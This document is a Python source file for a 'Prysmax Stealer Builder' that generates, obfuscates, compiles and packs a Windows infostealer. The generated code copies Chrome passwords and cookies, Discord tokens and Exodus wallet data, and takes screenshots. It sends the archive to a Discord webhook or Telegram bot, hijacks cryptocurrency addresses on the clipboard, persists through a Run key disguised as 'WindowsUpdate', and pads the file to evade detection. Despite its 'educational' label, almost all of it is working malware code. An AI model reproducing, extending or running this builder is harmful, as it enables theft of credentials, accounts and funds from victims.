#!/usr/bin/env python3
"""
Prysmax Stealer Builder
Educational content only
"""

import os
import sys
import json
import shutil
import tempfile
import subprocess
from datetime import datetime
from pathlib import Path

class StealerBuilder:
    def __init__(self, config):
        self.config = config
        self.build_dir = tempfile.mkdtemp(prefix="prysmax_build_")
        self.output_dir = config.get("builder", {}).get("output_directory", "builds/")
        
    def build_stealer(self, build_config):
        """Build stealer executable with specified configuration"""
        try:
            print("[BUILDER] Starting build process...")
            
            # Create build directory
            os.makedirs(self.output_dir, exist_ok=True)
            
            # Generate stealer code
            stealer_code = self.generate_stealer_code(build_config)
            
            # Write stealer code to file
            stealer_file = os.path.join(self.build_dir, "stealer.py")
            with open(stealer_file, 'w') as f:
                f.write(stealer_code)
            
            # Apply obfuscation if enabled
            if build_config.get("protection", {}).get("obfuscation", False):
                stealer_code = self.obfuscate_code(stealer_code)
                with open(stealer_file, 'w') as f:
                    f.write(stealer_code)
            
            # Compile to executable
            exe_path = self.compile_to_exe(stealer_file, build_config)
            
            # Apply post-build protections
            final_exe = self.apply_post_build_protections(exe_path, build_config)
            
            print(f"[BUILDER] Build completed: {final_exe}")
            return final_exe
            
        except Exception as e:
            print(f"[BUILDER] Build failed: {e}")
            return None
        finally:
            # Cleanup build directory
            try:
                shutil.rmtree(self.build_dir, ignore_errors=True)
            except:
                pass
    
    def generate_stealer_code(self, build_config):
        """Generate stealer code based on configuration"""
        try:
            # Base stealer template
            code_template = '''#!/usr/bin/env python3
"""
Generated Prysmax Stealer
Educational content only
"""

import os
import sys
import json
import time
import threading
import tempfile
import zipfile
from datetime import datetime
from pathlib import Path

# Configuration
CONFIG = {config_json}

# Protection imports
{protection_imports}

# Stealer modules
{stealer_modules}

class GeneratedStealer:
    def __init__(self):
        self.temp_dir = tempfile.mkdtemp(prefix="data_")
        self.victim_id = self.generate_victim_id()
        
        # Apply protections
        {protection_code}
        
    def generate_victim_id(self):
        import uuid
        import socket
        hostname = socket.gethostname()
        unique_id = str(uuid.uuid4())[:8]
        return f"{{hostname}}-{{unique_id}}"
    
    def run(self):
        try:
            print(f"[STEALER] Starting for victim: {{self.victim_id}}")
            
            victim_dir = os.path.join(self.temp_dir, self.victim_id)
            os.makedirs(victim_dir, exist_ok=True)
            
            # Execute enabled modules
            {execution_code}
            
            # Create archive and send
            archive_path = self.create_archive(victim_dir)
            self.send_logs(archive_path)
            
            # Cleanup
            self.cleanup()
            
        except Exception as e:
            print(f"[STEALER] Error: {{e}}")
    
    def create_archive(self, victim_dir):
        try:
            archive_path = os.path.join(self.temp_dir, f"Prysmax-{{self.victim_id}}.zip")
            
            with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(victim_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arc_name = os.path.relpath(file_path, victim_dir)
                        zipf.write(file_path, arc_name)
            
            return archive_path
        except Exception as e:
            print(f"[STEALER] Archive error: {{e}}")
            return None
    
    def send_logs(self, archive_path):
        try:
            if not archive_path or not os.path.exists(archive_path):
                return
            
            # Send to Discord webhook
            webhook_url = CONFIG.get("webhook_url")
            if webhook_url:
                self.send_to_discord(archive_path, webhook_url)
            
            # Send to Telegram
            telegram_config = CONFIG.get("telegram_config", {{}})
            if telegram_config.get("bot_token") and telegram_config.get("chat_id"):
                self.send_to_telegram(archive_path, telegram_config)
                
        except Exception as e:
            print(f"[STEALER] Send error: {{e}}")
    
    def send_to_discord(self, archive_path, webhook_url):
        try:
            import requests
            
            file_size = os.path.getsize(archive_path)
            if file_size < 8 * 1024 * 1024:  # 8MB limit
                with open(archive_path, 'rb') as f:
                    files = {{'file': (os.path.basename(archive_path), f, 'application/zip')}}
                    data = {{
                        'content': f'🔥 New victim: {{self.victim_id}}'
                    }}
                    
                    response = requests.post(webhook_url, data=data, files=files, timeout=30)
                    if response.status_code == 200:
                        print("[STEALER] Sent to Discord")
                        
        except Exception as e:
            print(f"[STEALER] Discord error: {{e}}")
    
    def send_to_telegram(self, archive_path, telegram_config):
        try:
            import requests
            
            bot_token = telegram_config["bot_token"]
            chat_id = telegram_config["chat_id"]
            
            # Send message
            url = f"https://api.telegram.org/bot{{bot_token}}/sendMessage"
            data = {{
                'chat_id': chat_id,
                'text': f'🔥 New victim: {{self.victim_id}}'
            }}
            requests.post(url, data=data, timeout=30)
            
            # Send file
            file_size = os.path.getsize(archive_path)
            if file_size < 50 * 1024 * 1024:  # 50MB limit
                url = f"https://api.telegram.org/bot{{bot_token}}/sendDocument"
                with open(archive_path, 'rb') as f:
                    files = {{'document': f}}
                    data = {{
                        'chat_id': chat_id,
                        'caption': f'Archive from {{self.victim_id}}'
                    }}
                    requests.post(url, data=data, files=files, timeout=60)
                    print("[STEALER] Sent to Telegram")
                    
        except Exception as e:
            print(f"[STEALER] Telegram error: {{e}}")
    
    def cleanup(self):
        try:
            import shutil
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except:
            pass

{stealer_classes}

if __name__ == "__main__":
    try:
        stealer = GeneratedStealer()
        stealer.run()
    except Exception as e:
        print(f"[STEALER] Fatal error: {{e}}")
'''
            
            # Generate configuration JSON
            config_json = json.dumps(build_config, indent=4)
            
            # Generate protection imports
            protection_imports = self.generate_protection_imports(build_config)
            
            # Generate stealer modules
            stealer_modules = self.generate_stealer_modules(build_config)
            
            # Generate protection code
            protection_code = self.generate_protection_code(build_config)
            
            # Generate execution code
            execution_code = self.generate_execution_code(build_config)
            
            # Generate stealer classes
            stealer_classes = self.generate_stealer_classes(build_config)
            
            # Fill template
            final_code = code_template.format(
                config_json=config_json,
                protection_imports=protection_imports,
                stealer_modules=stealer_modules,
                protection_code=protection_code,
                execution_code=execution_code,
                stealer_classes=stealer_classes
            )
            
            return final_code
            
        except Exception as e:
            print(f"[BUILDER] Code generation error: {e}")
            return ""
    
    def generate_protection_imports(self, build_config):
        """Generate protection-related imports"""
        imports = []
        
        protection = build_config.get("protection", {})
        
        if protection.get("anti_debug", False):
            imports.append("import ctypes")
        
        if protection.get("crypto_clipper", False):
            imports.append("try:\n    import win32clipboard\n    import win32con\nexcept:\n    pass")
        
        return "\n".join(imports)
    
    def generate_stealer_modules(self, build_config):
        """Generate stealer module imports"""
        modules = []
        
        features = build_config.get("features", {})
        
        if features.get("passwords", False) or features.get("cookies", False):
            modules.append("import sqlite3")
            modules.append("import shutil")
            modules.append("import base64")
        
        if features.get("screenshot", False):
            modules.append("try:\n    from PIL import ImageGrab\nexcept:\n    pass")
        
        return "\n".join(modules)
    
    def generate_protection_code(self, build_config):
        """Generate protection initialization code"""
        code_lines = []
        
        protection = build_config.get("protection", {})
        
        if protection.get("anti_debug", False):
            code_lines.append("        self.check_debugger()")
        
        if protection.get("startup", False):
            code_lines.append("        self.enable_persistence()")
        
        if protection.get("crypto_clipper", False):
            code_lines.append("        self.start_clipper()")
        
        return "\n".join(code_lines)
    
    def generate_execution_code(self, build_config):
        """Generate stealer execution code"""
        code_lines = []
        
        features = build_config.get("features", {})
        
        if features.get("passwords", False):
            code_lines.append("            self.steal_passwords(victim_dir)")
        
        if features.get("cookies", False):
            code_lines.append("            self.steal_cookies(victim_dir)")
        
        if features.get("discord_tokens", False):
            code_lines.append("            self.steal_discord_tokens(victim_dir)")
        
        if features.get("wallets", False):
            code_lines.append("            self.steal_wallets(victim_dir)")
        
        if features.get("screenshot", False):
            code_lines.append("            self.take_screenshot(victim_dir)")
        
        return "\n".join(code_lines)
    
    def generate_stealer_classes(self, build_config):
        """Generate stealer method implementations"""
        methods = []
        
        features = build_config.get("features", {})
        protection = build_config.get("protection", {})
        
        # Add protection methods
        if protection.get("anti_debug", False):
            methods.append(self.get_anti_debug_method())
        
        if protection.get("startup", False):
            methods.append(self.get_persistence_method())
        
        if protection.get("crypto_clipper", False):
            methods.append(self.get_clipper_method())
        
        # Add stealer methods
        if features.get("passwords", False):
            methods.append(self.get_password_stealer_method())
        
        if features.get("cookies", False):
            methods.append(self.get_cookie_stealer_method())
        
        if features.get("discord_tokens", False):
            methods.append(self.get_discord_stealer_method())
        
        if features.get("wallets", False):
            methods.append(self.get_wallet_stealer_method())
        
        if features.get("screenshot", False):
            methods.append(self.get_screenshot_method())
        
        return "\n\n".join(methods)
    
    def get_anti_debug_method(self):
        return '''    def check_debugger(self):
        try:
            if os.name == 'nt':
                kernel32 = ctypes.windll.kernel32
                if kernel32.IsDebuggerPresent():
                    os._exit(1)
        except:
            pass'''
    
    def get_persistence_method(self):
        return '''    def enable_persistence(self):
        try:
            import winreg
            exe_path = sys.executable
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
        except:
            pass'''
    
    def get_clipper_method(self):
        return '''    def start_clipper(self):
        try:
            def monitor_clipboard():
                import time
                while True:
                    try:
                        win32clipboard.OpenClipboard()
                        data = win32clipboard.GetClipboardData(win32con.CF_TEXT)
                        win32clipboard.CloseClipboard()
                        
                        # Replace crypto addresses here
                        if len(data) >= 26 and len(data) <= 42:
                            if data.startswith('1') or data.startswith('3') or data.startswith('bc1'):
                                # Replace with your Bitcoin address
                                new_address = "1YourBitcoinAddressHere"
                                win32clipboard.OpenClipboard()
                                win32clipboard.EmptyClipboard()
                                win32clipboard.SetClipboardData(win32con.CF_TEXT, new_address)
                                win32clipboard.CloseClipboard()
                    except:
                        pass
                    time.sleep(1)
            
            threading.Thread(target=monitor_clipboard, daemon=True).start()
        except:
            pass'''
    
    def get_password_stealer_method(self):
        return '''    def steal_passwords(self, output_dir):
        try:
            passwords_dir = os.path.join(output_dir, "Passwords")
            os.makedirs(passwords_dir, exist_ok=True)
            
            # Chrome passwords
            chrome_path = os.path.expanduser("~\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data")
            if os.path.exists(chrome_path):
                dest_path = os.path.join(passwords_dir, "chrome_passwords.db")
                shutil.copy2(chrome_path, dest_path)
        except:
            pass'''
    
    def get_cookie_stealer_method(self):
        return '''    def steal_cookies(self, output_dir):
        try:
            cookies_dir = os.path.join(output_dir, "Cookies")
            os.makedirs(cookies_dir, exist_ok=True)
            
            # Chrome cookies
            chrome_cookies = os.path.expanduser("~\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Network\\\\Cookies")
            if os.path.exists(chrome_cookies):
                dest_path = os.path.join(cookies_dir, "chrome_cookies.db")
                shutil.copy2(chrome_cookies, dest_path)
        except:
            pass'''
    
    def get_discord_stealer_method(self):
        return '''    def steal_discord_tokens(self, output_dir):
        try:
            discord_dir = os.path.join(output_dir, "Discord")
            os.makedirs(discord_dir, exist_ok=True)
            
            # Discord tokens from Local Storage
            discord_path = os.path.expanduser("~\\\\AppData\\\\Roaming\\\\discord\\\\Local Storage\\\\leveldb")
            if os.path.exists(discord_path):
                dest_path = os.path.join(discord_dir, "discord_leveldb")
                shutil.copytree(discord_path, dest_path, dirs_exist_ok=True)
        except:
            pass'''
    
    def get_wallet_stealer_method(self):
        return '''    def steal_wallets(self, output_dir):
        try:
            wallets_dir = os.path.join(output_dir, "Wallets")
            os.makedirs(wallets_dir, exist_ok=True)
            
            # Exodus wallet
            exodus_path = os.path.expanduser("~\\\\AppData\\\\Roaming\\\\Exodus")
            if os.path.exists(exodus_path):
                dest_path = os.path.join(wallets_dir, "Exodus")
                shutil.copytree(exodus_path, dest_path, dirs_exist_ok=True)
        except:
            pass'''
    
    def get_screenshot_method(self):
        return '''    def take_screenshot(self, output_dir):
        try:
            screenshot_dir = os.path.join(output_dir, "Screenshots")
            os.makedirs(screenshot_dir, exist_ok=True)
            
            screenshot = ImageGrab.grab()
            screenshot_path = os.path.join(screenshot_dir, "screenshot.png")
            screenshot.save(screenshot_path, "PNG")
        except:
            pass'''
    
    def obfuscate_code(self, code):
        """Apply code obfuscation"""
        try:
            # Simple string obfuscation
            import base64
            import re
            
            def encode_string(match):
                string_content = match.group(1)
                encoded = base64.b64encode(string_content.encode()).decode()
                return f'base64.b64decode("{encoded}").decode()'
            
            # Obfuscate string literals
            code = re.sub(r'"([^"]*)"', encode_string, code)
            
            return code
            
        except Exception as e:
            print(f"[BUILDER] Obfuscation error: {e}")
            return code
    
    def compile_to_exe(self, stealer_file, build_config):
        """Compile Python script to executable"""
        try:
            filename = build_config.get("filename", "stealer")
            if not filename.endswith(".exe"):
                filename += ".exe"
            
            output_path = os.path.join(self.output_dir, filename)
            
            # Use PyInstaller to compile
            cmd = [
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--distpath", self.output_dir,
                "--workpath", self.build_dir,
                "--specpath", self.build_dir,
                "--name", filename.replace(".exe", ""),
                stealer_file
            ]
            
            # Add icon if specified
            icon_path = self.config.get("builder", {}).get("icon_path")
            if icon_path and os.path.exists(icon_path):
                cmd.extend(["--icon", icon_path])
            
            # Run PyInstaller
            result = subprocess.run(cmd, capture_output=True, text=True, cwd=self.build_dir)
            
            if result.returncode == 0:
                print("[BUILDER] Compilation successful")
                return output_path
            else:
                print(f"[BUILDER] Compilation failed: {result.stderr}")
                return None
                
        except Exception as e:
            print(f"[BUILDER] Compilation error: {e}")
            return None
    
    def apply_post_build_protections(self, exe_path, build_config):
        """Apply post-build protections"""
        try:
            if not exe_path or not os.path.exists(exe_path):
                return exe_path
            
            protection = build_config.get("protection", {})
            
            # UPX packing
            if protection.get("upx_packing", False):
                exe_path = self.apply_upx_packing(exe_path)
            
            # File pumping (increase file size)
            if protection.get("pumper", False):
                exe_path = self.apply_file_pumping(exe_path)
            
            return exe_path
            
        except Exception as e:
            print(f"[BUILDER] Post-build protection error: {e}")
            return exe_path
    
    def apply_upx_packing(self, exe_path):
        """Apply UPX packing to reduce file size"""
        try:
            # Check if UPX is available
            result = subprocess.run(["upx", "--version"], capture_output=True)
            if result.returncode != 0:
                print("[BUILDER] UPX not available, skipping packing")
                return exe_path
            
            # Apply UPX compression
            cmd = ["upx", "--best", "--lzma", exe_path]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                print("[BUILDER] UPX packing applied")
            else:
                print(f"[BUILDER] UPX packing failed: {result.stderr}")
            
            return exe_path
            
        except Exception as e:
            print(f"[BUILDER] UPX error: {e}")
            return exe_path
    
    def apply_file_pumping(self, exe_path):
        """Increase file size to evade size-based detection"""
        try:
            # Add random data to end of file
            import random
            
            pump_size = random.randint(5, 20) * 1024 * 1024  # 5-20 MB
            
            with open(exe_path, 'ab') as f:
                # Write random bytes
                for _ in range(pump_size // 1024):
                    random_data = bytes([random.randint(0, 255) for _ in range(1024)])
                    f.write(random_data)
            
            print(f"[BUILDER] File pumped by {pump_size // (1024*1024)} MB")
            return exe_path
            
        except Exception as e:
            print(f"[BUILDER] File pumping error: {e}")
            return exe_path

